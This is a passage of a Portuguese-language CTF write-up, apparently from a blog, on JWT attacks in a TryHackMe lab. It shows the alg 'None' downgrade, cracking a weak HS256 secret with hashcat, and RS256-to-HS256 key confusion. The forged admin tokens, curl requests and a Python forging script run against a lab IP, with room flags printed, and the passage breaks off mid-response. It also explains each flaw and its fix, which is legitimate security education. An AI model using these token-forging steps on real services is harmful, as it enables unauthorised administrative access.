+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h3 data-hextra-search-id="downgrading-para-none">Downgrading para None<span class="hx:absolute hx:-mt-20" id="downgrading-para-none"></span>
+    <a href="#downgrading-para-none" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Outra tipo de falha na assinatura de algoritmos é downgrade para <code>None</code>, isso significa que a aplicação não utiliza nenhum tipo de assinatura. Essa opção foi pensada para ser utilizada em comunicação de servidores, onde assinatura do JWT já foi verificada no ínicio da comunicação, sendo assim, o segundo servidor não precisa solicitar a validação de assinatura. Porém, alguns desenvolvedores não travam ou não negam ela quando a requisição é feita, dessa forma, basta o atacante alterar o JWT para verificação de assinatura sempre retornar <code>true</code>.</p>
+<h4 data-hextra-search-id="exemplo-3">Exemplo 3<span class="hx:absolute hx:-mt-20" id="exemplo-3"></span>
+    <a href="#exemplo-3" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Para esse exemplo teremos que autenticar na aplicação primeiro.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# 
+</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>     -X POST -d <span style="color:#e6db74">&#39;{ &#34;username&#34; : &#34;user&#34;, &#34;password&#34; : &#34;password3&#34; }&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>     http://10.10.86.110/api/v1.0/example3
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;token&#34;</span>: <span style="color:#e6db74">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Agora precisamos alterar o tipo de algoritmo de verificação do campo <code>alg</code>para <code>None</code>.
+O cabeçalho do JWT está em <strong>URL encode base64</strong>  conforme mostrado usando CyberChef.</p>
+<p><img src="/assets/img/posts/2025/01/JWT-SECURITY/JWT-example3.webp" alt="JWT EXAMPLE 3-1"  loading="lazy" /></p>
+<p>Para alteramos o tipo de algoritmo basta realizamos o inverso usando <strong>Base64 encode</strong>.</p>
+<p><code>{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;None&quot;}</code>:<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0</code></p>
+<p><img src="/assets/img/posts/2025/01/JWT-SECURITY/JWT-example3-2.webp" alt="JWT EXAMPLE 3-2"  loading="lazy" /></p>
+<p>Feito a alteração do cabeçalho ainda precisamos alterar o valor do campo <code>admin</code> para <code>1</code>, para isso utilizaremos a ferramenta <a
+    href="https://jwt.io/"target="_blank" rel="noopener">jwt io</a> novamente.</p>
+<p><img src="/assets/img/posts/2025/01/JWT-SECURITY/JWT-example3-3.webp" alt="JWT EXAMPLE 3-3"  loading="lazy" /></p>
+<p>Agora com o valor definido como 1 e <code>alg</code>como <code>None</code> podemos montar nosso JWT.</p>
+<ul>
+<li>Novo cabeçalho: <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0</code></li>
+<li>Payload: <code>eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0</code></li>
+<li>Assinatura: <code>_yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8</code></li>
+</ul>
+<p>Precisamos ainda alterar nosso usuário que é passado na URL para <code>admim</code>, com isso podemos realizar o teste e verificar a vulnerabilidade.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# 
+</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span> http://10.10.86.110/api/v1.0/example3?username<span style="color:#f92672">=</span>admin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Welcome admin, you are an admin, here is your flag: THM{fb9341e4-5823-475f-ae50-4f9a1a4489ba}&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h4 data-hextra-search-id="desenvolvimento-do-erro-1">Desenvolvimento do erro<span class="hx:absolute hx:-mt-20" id="desenvolvimento-do-erro-1"></span>
+    <a href="#desenvolvimento-do-erro-1" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Na perspectiva do desenvolvedor, a implementação da aplicação deve suportar diversos tipos de algoritmos de verificação, a implementação normalmente então lê o cabeçalho do JWT, realiza um parse em busca do campo <code>alg</code> (mostrado no código abaixo).
+Entretanto o atacante especifica <code>None</code> como algoritmo, com isso a verificação de assinatura é ignorada.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>header <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>get_unverified_header(token) 
+</span></span><span style="display:flex;"><span>signature_algorithm <span style="color:#f92672">=</span> header[<span style="color:#e6db74">&#39;alg&#39;</span>] 
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, self<span style="color:#f92672">.</span>secret, algorithms<span style="color:#f92672">=</span>signature_algorithm)</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h4 data-hextra-search-id="correção-2">Correção<span class="hx:absolute hx:-mt-20" id="correção-2"></span>
+    <a href="#corre%c3%a7%c3%a3o-2" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Se a API precisa suportar diversos algoritmos o ideal é informa-los, declarando-os na função de decodificação, como é mostrado no exemplo abaixo.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, self<span style="color:#f92672">.</span>secret, algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;HS256&#34;</span>, <span style="color:#e6db74">&#34;HS384&#34;</span>, <span style="color:#e6db74">&#34;HS512&#34;</span>]) username <span style="color:#f92672">=</span> payload[<span style="color:#e6db74">&#39;username&#39;</span>] 
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>db_lookup(username, <span style="color:#e6db74">&#34;flag&#34;</span>)</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h3 data-hextra-search-id="segredos-simétricos-fracos">Segredos simétricos fracos<span class="hx:absolute hx:-mt-20" id="segredos-simétricos-fracos"></span>
+    <a href="#segredos-sim%c3%a9tricos-fracos" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Quando usamos um algoritmo de segredo simétrico a segurança do JWT é confiada a entropia e a &ldquo;força&rdquo; que o segredo usa. Dessa forma, se o segredo for fraco, podemos utilizar um ataque de dicionario para tentar quebra-lo, podendo assim alterar o JWT.</p>
+<h4 data-hextra-search-id="exemplo-4">Exemplo 4<span class="hx:absolute hx:-mt-20" id="exemplo-4"></span>
+    <a href="#exemplo-4" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Primeiro vamos gerar nosso JWT.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# 
+</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> <span style="color:#ae81ff">\ </span>                                                                                                       
+</span></span><span style="display:flex;"><span>     -X POST -d <span style="color:#e6db74">&#39;{ &#34;username&#34; : &#34;user&#34;, &#34;password&#34; : &#34;password4&#34; }&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>     http://10.10.86.110/api/v1.0/example4
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;token&#34;</span>: <span style="color:#e6db74">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Após obtemos nosso JWT já podemos tentar quebra-lo, no caso, iremos usar a mesma ferramenta que a aula orienta, mas podemos utilizar o John para essa tarefa também caso necessário.</p>
+<ul>
+<li>Salvar o JWT em um arquivo.</li>
+<li>Realizar o download da wordlist que usaremos no ataque.</li>
+<li>Uitilizar o hashcat: <code>hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list</code></li>
+</ul>
+<p>O segredo é quebrado, com isso podemos alterar o JWT e forjar um acesso com usuário <code>admin</code>.</p>
+<p>Segredo:<code>secret</code></p>
+<p><img src="/assets/img/posts/2025/01/JWT-SECURITY/JWT-example4.webp" alt="JWT EXAMPLE 4"  loading="lazy" /></p>
+<p>Com a ferramenta <a
+    href="https://jwt.io/"target="_blank" rel="noopener">jwt io</a> realizamos nossa alteração do JWT.</p>
+<p><img src="/assets/img/posts/2025/01/JWT-SECURITY/JWT-example4-1.webp" alt="JWT EXAMPLE 4"  loading="lazy" /></p>
+<p>Com nosso JWT alterado realizamos uma requisição e verificamos se conseguimos obter o acesso administrativo.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/FolderShare/Tryhack Me/JWT-rooms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# 
+</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.gpHtgNe4OSgiQHuf8W7JFfSNTi9tEnDKvK7QAk2DFBc&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span> http://10.10.86.110/api/v1.0/example4?username<span style="color:#f92672">=</span>admin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Welcome admin, you are an admin, here is your flag: THM{e1679fef-df56-41cc-85e9-af1e0e12981b}&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h4 data-hextra-search-id="desenvolvimento-do-erro-2">Desenvolvimento do erro<span class="hx:absolute hx:-mt-20" id="desenvolvimento-do-erro-2"></span>
+    <a href="#desenvolvimento-do-erro-2" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>O erro ocorre no desenvolvimento de segredos fracos, tornando assim sua quebra ser fácil.</p>
+<h4 data-hextra-search-id="correção-3">Correção<span class="hx:absolute hx:-mt-20" id="correção-3"></span>
+    <a href="#corre%c3%a7%c3%a3o-3" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Utilizar criação de segredos por algoritmos fortes e não por humanos, strings longas e aleatórias.</p>
+<h3 data-hextra-search-id="confundindo-o-algoritmo-de-assinatura">Confundindo o algoritmo de assinatura<span class="hx:absolute hx:-mt-20" id="confundindo-o-algoritmo-de-assinatura"></span>
+    <a href="#confundindo-o-algoritmo-de-assinatura" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>O ataque ocorre em um downgrade forçado de algoritmo de assinatura, basicamente ocorre uma confusão entre algoritmo simétrico e assimétrico, exemplo, se o algoritmo assimétrico sendo usado é <code>RS256</code> pode ser feito o downgrade para <code>HS256</code>, nesse caso algumas bibliotecas padrão voltam usando chave pública como sendo o segredo para o algoritmo simétrico de assinatura, sabendo a chave pública podemos forjar uma assinatura válida usando algoritmo <code>HS256</code> combinando-o com a chave pública.</p>
+<h4 data-hextra-search-id="example-5">Example 5<span class="hx:absolute hx:-mt-20" id="example-5"></span>
+    <a href="#example-5" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Como de costume vamos primeiro gerar nosso JWT.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/FolderShare/Tryhack Me/JWT-rooms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─#  curl -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -X POST -d <span style="color:#e6db74">&#39;{ &#34;username&#34; : &#34;user&#34;, &#34;password&#34; : &#34;password5&#34; }&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  http://10.10.86.110/api/v1.0/example5
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;public_key&#34;</span>: <span style="color:#e6db74">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHSoarRoLvgAk4O41RE0w6lj2e7TDTbFk62WvIdJFo/aSLX/x9oc3PDqJ0Qu1x06/8PubQbCSLfWUyM7Dk0+irzb/VpWAurSh+hUvqQCkHmH9mrWpMqs5/L+rluglPEPhFwdL5yWk5kS7rZMZz7YaoYXwI7Ug4Es4iYbf6+UV0sudGwc3HrQ5uGUfOpmixUO0ZgTUWnrfMUpy2dFbZp7puQS6T8b5EJPpLY+iojMb/rbPB34NrvJKU1F84tfvY8xtg3HndTNPyNWp7EOsujKZIxKF5/RdW+Qf9jjBMvsbjfCo0LiNVjpotiLPVuslsEWun+LogxR+fxLiUehSBb8ip&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;token&#34;</span>: <span style="color:#e6db74">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.kR4DjBkwFE9dzPNeiboHqkPhs52QQgaHcC2_UGCtJ3qo2uY-vANIC6qicdsfT37McWYauzm92xflspmSVvrvwXdC2DAL9blz3YRfUOcXJT03fVM7nGp8E7uWSBy9UESLQ6PBZ_c_dTUJhWg35K3d8Jao2czC0JGN3EQxhcCGtxJ1R7T9tzBMaqW-IRXfTCq3BOxVVF66ePEfvG7gdyjAnWrQFktRBIhU4LoYwem3UZ7PolFf0v2i6jpnRJzMpqd2c9oMHOjhCZpy_yJNl-1F_UBbAF1L-pn6SHBOFdIFt_IasJDVPr1Ybv75M26o8OBwUJ1KK_rwX41y5BCNGcks9Q&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Recebemos nosso JWT com a pública key, o algoritmo sendo utilizado é <code>RS256</code>, agora vamos realizar o downgrade utilizando a chave pública e programa em python fornecido.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> jwt 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>public_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ADD_KEY_HERE&#34;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#39;username&#39;</span> : <span style="color:#e6db74">&#39;user&#39;</span>, <span style="color:#e6db74">&#39;admin&#39;</span> : <span style="color:#ae81ff">1</span> } 
+</span></span><span style="display:flex;"><span>access_token <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>encode(payload, public_key, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;HS256&#34;</span>) 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print (access_token)</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Conforme é mencionado na aula, antes de executar nosso script precisamos realizar algumas alterações na biblioteca <code>jwt</code>, nesse caso vamos usar a própria máquina virtual da plataforma.</p>
+<ul>
+<li>Editar o arquivo <code>/usr/lib/python3/dist-packages/jwt/algorithms.py</code>.</li>
+<li>Comentar as linhas 143 até 146.</li>
+</ul>
+<p><img src="/assets/img/posts/2025/01/JWT-SECURITY/JWT-example5.webp" alt="JWT EXAMPLE 5"  loading="lazy" /></p>
+<p>Após isso executamos nosso script e obtemos nosso JWT.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@ip-10-10-69-152:~# 
+</span></span><span style="display:flex;"><span>python3 JWT.py 
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.7jJBvWpF9JT4DdeUWnl0o7imBV0wa0HTDPRMavGbPyU&#39;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Agora podemos realizar a requisição.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/FolderShare/Tryhack Me/JWT-rooms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# 
+</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.7jJBvWpF9JT4DdeUWnl0o7imBV0wa0HTDPRMavGbPyU&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span> http://10.10.86.110/api/v1.0/example5?username<span style="color:#f92672">=</span>admin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
